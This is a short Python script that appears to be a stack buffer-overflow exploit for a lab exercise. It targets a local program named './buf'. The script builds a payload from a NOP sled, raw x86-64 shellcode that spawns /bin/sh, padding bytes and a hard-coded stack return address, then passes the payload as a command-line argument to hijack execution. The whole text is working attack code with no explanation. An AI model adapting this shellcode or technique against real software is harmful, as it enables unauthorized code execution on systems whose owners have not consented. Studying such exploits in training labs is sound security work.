from subprocess import call
from struct import pack

# 0x7fffffffda10 + 0x4 -> 0x7fffffffda14
# 0x7fffffffda18

# NOP_REPLACE = 'A'*76
NOP='\x90'*76
SHELLCODE = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
JUNK = 'A'*12+'B'*8
RETURN_ADDRESS = '\x1c\xda\xff\xff\xff\x7f'
PAYLOAD = NOP + SHELLCODE + JUNK + RETURN_ADDRESS

# exec program with final payload as arg
call(['./buf', PAYLOAD])